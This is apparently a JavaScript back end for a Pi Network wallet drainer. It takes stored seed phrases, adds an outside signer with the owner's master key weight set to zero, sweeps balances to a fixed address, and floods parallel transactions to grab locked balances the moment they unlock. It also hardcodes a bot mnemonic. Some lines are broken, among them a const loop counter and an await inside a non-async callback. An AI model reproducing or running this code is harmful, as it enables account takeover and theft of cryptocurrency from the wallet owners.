import axios from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';
import bip39 from 'bip39';
import ed25519 from 'ed25519-hd-key';
import { Keypair, TransactionBuilder, Operation, Asset, Account, FeeBumpTransaction, Memo   } from 'stellar-base';
import Sponsors from '../models/Sponsors.js';
import Passphrase from '../models/Passphrase.js';
import { Server, Keypair as StellarKeypair, TransactionBuilder as StellarTransactionBuilder, Operation as StellarOperation } from 'stellar-sdk';

const HORIZON = 'http://localhost:8000';
const NETWORK_PASSPHRASE = 'Pi Network';
export const PI_PUBLIC_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
// const PI_PUBLIC_ADDRESS = 'GDEZT7O6BFGB6LPSNMQAVTMTNCEVOJKNQ3W67Q5W5KENWWABMCO24E5U';
const BOT_PHRASE = 'logic resemble wise decline unhappy all arrive engage motor shop borrow one rabbit pattern flight draw inflict wolf boy grit social black hand rate';

const server = new Server(HORIZON, { allowHttp: true });


export function getKeypairFromPassphrase(mnemonic) {
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const derived = ed25519.derivePath("m/44'/314159'/0'", seed);
    return Keypair.fromRawEd25519Seed(derived.key);
}

export function getSDKKeypairFromPassphrase(mnemonic) {
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const derived = ed25519.derivePath("m/44'/314159'/0'", seed);
    return StellarKeypair.fromRawEd25519Seed(derived.key);
}

export function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

export async function getAccount(publicKey) {

    try {
        const response = await axios.get(
            `${HORIZON}/accounts/${publicKey}`,
            {
                headers: { 'Content-Type': 'application/json' },
            }
        );
        return response.data;
    } catch(err) {
        // console.error(`❌ Failed to fetch account [${publicKey}]:`, err.response?.data || err.message);
        throw err;
    }
}

export async function buildAndSubmitMultiSigTx(passphrase) {

    const kp = getSDKKeypairFromPassphrase(passphrase);
    const account = await server.loadAccount(kp.publicKey());
    const baseFee = await getBaseFee();

    // return { passphrase, publicKey: kp.publicKey(), account: accountData };

    const tx = new StellarTransactionBuilder(account, {
        fee: baseFee,
        networkPassphrase: NETWORK_PASSPHRASE,
    })
        .addOperation(StellarOperation.setOptions({
            signer: {
                ed25519PublicKey: "GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS",
                weight: 2,
            }
        }))
        .addOperation(StellarOperation.setOptions({
            masterWeight: 0,
            lowThreshold: 2,
            medThreshold: 2,
            highThreshold: 2
        }))
        .setTimeout(30)
        .build();

    tx.sign(kp);

    try {
        const res = await server.submitTransaction(tx);

        return res.data;

    } catch(e) {
        if (e.response?.status === 504) {
        // Try to fetch the transaction by hash
        const txHash = tx.hash().toString('hex');
        const txStatus = await axios.get(`${HORIZON}/transactions/${txHash}`);
        return txStatus.data; // It may have gone through
        } else {
            throw e;
        }
    }
}

export async function buildChannelTx(channelPhrase, mainKp, balanceId, recipient, amount, feeMultiplier = 2) {
    const channelKp = getKeypairFromPassphrase(channelPhrase);
    const accountData  = await getAccount(channelKp.publicKey());

    const channelAccount = new Account(channelKp.publicKey(), accountData.sequence);
    const baseFee = parseFloat(await getBaseFee()) * feeMultiplier;


	const tx = new TransactionBuilder(channelAccount, {
		fee: baseFee.toString(),
		networkPassphrase: 'Pi Network',

	})
    .addOperation(Operation.claimClaimableBalance({
		balanceId,
		source: mainKp.publicKey(),
    }))

    .addOperation(Operation.payment({
		destination: recipient,
		asset: Asset.native(),
		amount,
		source: mainKp.publicKey(),
    }))
    .addMemo(Memo.text('PiMaster'))
    .setTimeout(20)
    .build();

  	tx.sign(mainKp);
  	tx.sign(channelKp);

  	return tx.toXDR();
}

async function buildManualSequenceTx(channelKp, mainKp, sequence, balanceId, recipient, amount, feeMultiplier = 2) {
    const channelAccount = new Account(channelKp.publicKey(), sequence);
    const baseFee = parseFloat(await getBaseFee()) * feeMultiplier;

    const tx = new TransactionBuilder(channelAccount, {
        fee: baseFee.toString(),
        networkPassphrase: NETWORK_PASSPHRASE
    })
    .addOperation(Operation.claimClaimableBalance({
        balanceId,
        source: mainKp.publicKey()
    }))
    .addOperation(Operation.payment({
        destination: recipient,
        asset: Asset.native(),
        amount,
        source: mainKp.publicKey()
    }))
    .addMemo(Memo.text('PiClaim'))
    .setTimeout(20)
    .build();

    tx.sign(mainKp);
    tx.sign(channelKp);

    return tx.toXDR();
}

export async function FloodChannelManualSequence(mainPhrase, balanceId, recipient, amount) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const sponsors = await Sponsors.find();

    if (!sponsors || sponsors.length === 0) {
        return { success: false, error: "No sponsors found" };
    }

    let allTxs = [];
    for (const sponsor of sponsors) {
        const channelKp = getKeypairFromPassphrase(sponsor.mnemonic);

        const accountData  = await getAccount(channelKp.publicKey());

        let currentSeq = BigInt(accountData.sequence);
        console.log(`Current Sequence: ${accountData.sequence}`)

        const numTx = 1;
        for (let i = 0; i < numTx; i++) {
            const seq = (currentSeq + BigInt(i)).toString();
            console.log(`Using Sequence: ${seq}`)
            try {
                const xdr = await buildManualSequenceTx(channelKp, mainKp, seq, balanceId, recipient, amount);
                // allTxs.push(xdr);
                allTxs.push(xdr);
            } catch (err) {
                console.error(`❌ Error building TX for sponsor ${sponsor.mnemonic.slice(0, 5)}...:`, err.message);
            }
        }
    }

    // const limit = pLimit(30)
    const results = await Promise.all(
        // allTxs.map(xdr => limit(() => submitTransaction(xdr)))
        allTxs.map(xdr => submitTransaction(xdr))
    );

    return results;
}

export async function buildChannelFeeBumpTx(channelPhrase, mainKp, balanceId, recipient, amount) {
    const channelKp = getKeypairFromPassphrase(channelPhrase);
    const accountData  = await getAccount(channelKp.publicKey());
    const channelAccount = new Account(channelKp.publicKey(), accountData.sequence);

	const tx = new TransactionBuilder(channelAccount, {
		fee: '400000',
		networkPassphrase: 'Pi Network',


	})
    .addOperation(Operation.claimClaimableBalance({
		balanceId,
		source: mainKp.publicKey(),
    }))

    .addOperation(Operation.payment({
		destination: recipient,
		asset: Asset.native(),
		amount,
		source: mainKp.publicKey(),
    }))
    .setTimeout(40)
    .build();

  	tx.sign(mainKp);
  	tx.sign(channelKp);

    const feeBumpTx = TransactionBuilder.buildFeeBumpTransaction(
        channelKp, 
        "500000",
        tx,
        'Pi Network'
    );

    feeBumpTx.sign(channelKp);

  	return feeBumpTx.toXDR();
}


export async function submitTransaction(txXdr) {
    try {

        const res = await axios.post(
            `${HORIZON}/transactions`,
            `tx=${encodeURIComponent(txXdr)}`,
            { 
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            }
        );
        return res.data;
    } catch (err) {
        // console.log('❌ Client error submitting TX:', err);
        return { success: false, error: err.response?.data || err.message}
    }
}

export async function getClaimableBalance(publicKey) {
        try {
            const res = await axios.get(
                `${HORIZON}/claimable_balances?claimant=${publicKey}`,
                { 
                    headers: { 'Content-Type': 'application/json' },
                }
            );

            return res.data;
        } catch(err) {
            return { error: err }
        }
}

export async function FloodchannelTransaction(mainPhrase, balanceId, recipient, amount) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const allSponsors = await Sponsors.find();
    console.log(allSponsors);
    if(allSponsors) {
        const result = await Promise.all(allSponsors.map(async (sponsor, i) => {
            try {
                const xdr = await buildChannelTx(sponsor.mnemonic, mainKp, balanceId, recipient, amount);
                return await submitTransaction(xdr);
            } catch (err) {
                console.error(`❌ Error building/submitting for channel ${i}:`, err);
            }
        }));

        return result;
    }
    return { success: false, error: "No sponsored accounts found"}
}

export async function FloodFeeBumpTransaction(mainPhrase, balanceId, recipient, amount) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const allSponsors = await Sponsors.find();
    console.log(allSponsors);
    if(allSponsors) {
        const result = await Promise.all(allSponsors.map(async (sponsor, i) => {
            try {
                const xdr = await buildChannelFeeBumpTx(sponsor.mnemonic, mainKp, balanceId, recipient, amount);
                return await submitTransaction(xdr);
            } catch (err) {
                console.error(`❌ Error building/submitting for channel ${i}:`, err);
            }
        }));

        return result;
    }
    return { success: false, error: "No sponsored accounts found"}
}


export async function sweepWallet(mainPhrase, recipient) {

    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const accountData  = await getAccount(mainKp.publicKey());

    for (const i = 0; i < 1; i++) {
        const seq = (BigInt(accountData.sequence) + BigInt(i)).toString();
        const account = new Account(mainKp.publicKey(), seq);
        const balanceString = getBalance(accountData);
        const baseFee = parseFloat(await getBaseFee());

        const onePiInStroops = 10_000_000;
        const balance = parseFloat(balanceString);
        const txCharge = baseFee/onePiInStroops;
        const baseReserve = 0.5;
        const minReserve = 0.98;
        const withdrawable = Math.abs(balance - minReserve - txCharge);

        if(balance - minReserve - txCharge <= 0) {
            return;
        }

        const tx = new TransactionBuilder(account, {
            fee: baseFee.toString(),
            networkPassphrase: NETWORK_PASSPHRASE,
        })
            .addOperation(Operation.payment({
                destination: recipient,
                asset: Asset.native(),
                amount: withdrawable.toFixed(7),
            }))
            .setTimeout(30)
            .build();

        tx.sign(mainKp);
        
        const res = await axios.post(
            `${HORIZON}/transactions`,
            `tx=${encodeURIComponent(tx.toXDR())}`,
            { 
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            }
        );

        if(res.data.hash) {
            console.log(`Sweeped ${withdrawable.toFixed(7)}`)
            return {data: res.data, amount: withdrawable.toFixed(7)};
        }
    }
	

    return {data: { error: "No Pi sweeped" }, amount: 0.000};
}

export async function fundWallet(mainPhrase, recipient, amount) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const accountData  = await getAccount(mainKp.publicKey());
    const account = new Account(mainKp.publicKey(), accountData.sequence);
	const baseFee = parseFloat(await getBaseFee());

    const tx = new TransactionBuilder(account, {
        fee: baseFee.toString(),
        networkPassphrase: NETWORK_PASSPHRASE,
    })
        .addOperation(Operation.payment({
            destination: recipient,
            asset: Asset.native(),
            amount,
        }))
        .setTimeout(30)
        .build();

    tx.sign(mainKp);
	
    const res = await axios.post(
        `${HORIZON}/transactions`,
        `tx=${encodeURIComponent(tx.toXDR())}`,
        { 
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        }
    );

    return {data: res.data, amount: amount};
}


const FEE_CACHE_TTL = 10_000;

let cachedFee= null;
let lastFeeFetchTime = 0;
export async function getBaseFee() {
    const now = Date.now();
    if (cachedFee && (now - lastFeeFetchTime < FEE_CACHE_TTL)) {
        return cachedFee;
    }

    try {
        const response = await axios.get(`${HORIZON}/fee_stats`, 
            {
                headers: { 'Content-Type': 'application/json' },
            }
        );
        cachedFee = response.data.fee_charged.max; // returns string
        lastFeeFetchTime = now;
        return cachedFee;
    } catch (error) {
        console.error('❌ Failed to fetch fee stats:', error.message);
        // fallback to default
        return '100000';
    }
}

export function getBalance(account) {
	const balanceObj = account.balances.find(
		(b) => b.asset_type === 'native'
    );

    return balanceObj ? balanceObj.balance : '0';
}

export const autoClaimUnlocked = async () => {
    if(global.isUnlocking) return;
    global.isUnlocking = true;
    // console.log(`Trying auto claim now...`);
    const now = new Date();
    const fewMilliSecondsFromNow = new Date(now.getTime() +  200);

    const readyPassphrases = await Passphrase.find({
        claimableAt: { $lte: now },
        status: 'pending'
    });

    for (const p of readyPassphrases) {
        try {
            console.log(`🔄 Claiming for: ${p.mnemonic.slice(0, 10)}...`);

            FloodchannelTransaction(
                p.mnemonic,
                p.balanceId,
                PI_PUBLIC_ADDRESS,
                p.amount
            ).then(result => {
                const success = result.find(r => r.hash);

                if (success) {
                    console.log(`✅ Claimed Pi. Hash: ${success.hash}`);
                    await Passphrase.updateOne(
                        { _id: p._id },
                        { $set: { status: 'claimed' } }
                    );
                } else {
                    console.log(`❌ Failed to claim for balanceId: ${p.balanceId}, amount: ${p.amount}, mnemonic: ${p.mnemonic}`);
                    
                }
            });

            

        } catch (err) {
            console.error('❌ Error something went wrong Pi:', err.message || err);
        }
    }

    global.isUnlocking = false;

};

const sweepWithLogs = async (p) => {
    try {
        // console.log(`🔄 Sweeping for: ${p.mnemonic.slice(0, 10)}...`);

        const result = await sweepWallet(p.mnemonic, PI_PUBLIC_ADDRESS);
        const success = result.data;

        if (success.hash) {
            // console.log(`✅ Sweeped ${result.amount} Pi. Hash: ${success.hash}`);
        } else {
            // console.log(`❌ Failed to sweep for ${p.receiverAddress}`);
        }
    } catch (err) {
        // console.error('❌ Error sweeping Pi:', err.message || err);
    }
};

export const autoSweepWallet = async () => {
    if(global.isSweeping) {
	    return;
    }
    global.isSweeping = true
    const readyPassphrases = await Passphrase.find();

    for(const phrase of readyPassphrases) {
        await sweepWithLogs(phrase);
        await sleep(1000);
    }
    global.isSweeping = false;
};

export const autoFundWallet = async () => {
    if(global.isFunding || global.isUnlocking) return;
    global.isFunding = true;
    const sponsorsPhrase = await Sponsors.find( {name: 'whoami5677'} );

    for (const p of sponsorsPhrase) {
        try {
            // console.log(`🔄 funding for: ${p.mnemonic.slice(0, 10)}...`);


            const sponsorKp = getKeypairFromPassphrase(p.mnemonic);
            const accountData  = await getAccount(sponsorKp.publicKey());

            const balanceString = getBalance(accountData);
            const balance = parseFloat(balanceString) - 0.98;

            const change = balance - 0.1;

            const BotKP = getKeypairFromPassphrase(BOT_PHRASE);
            const botAccountData = await getAccount(BotKP.publicKey());
            const botBalanceString = getBalance(botAccountData);
            const botBalance = parseFloat(botBalanceString) - 1.98;



            if(change < 0 && botBalance > change) {
                const result = await fundWallet(
                    BOT_PHRASE,
                    sponsorKp.publicKey(),
                    Math.abs(change).toFixed(7)
                );

                const success = result.data;

                if (success.hash) {
                    // console.log(`✅ funded ${result.amount} Pi. Hash: ${success.hash}`);
                    
                } else {
                    // console.log(`❌ Failed to fund ${result.amount} PI}`);
                }
            }
            await sleep(5000);

        } catch (err) {
            // console.error('❌ Error funding Pi:', err.message || err);
        }
    }
    global.isFunding = false;
};

export const autoMarkAsClaim = async () => {

    const now = new Date();
    const inThirtySeconds = new Date(now.getTime() + 30 * 1000);

    const readyPassphrases = await Passphrase.find({
        claimableAt: { $lte: inThirtySeconds },
        status: 'pending'
    });

    for(const p of readyPassphrases) {
        await Passphrase.updateOne(
            { _id: p._id },
            { $set: { status: 'claimed' } }
        );
        console.log(`🕒 Marked as claimed (claimableAt passed 30s ago)`);
    }

};

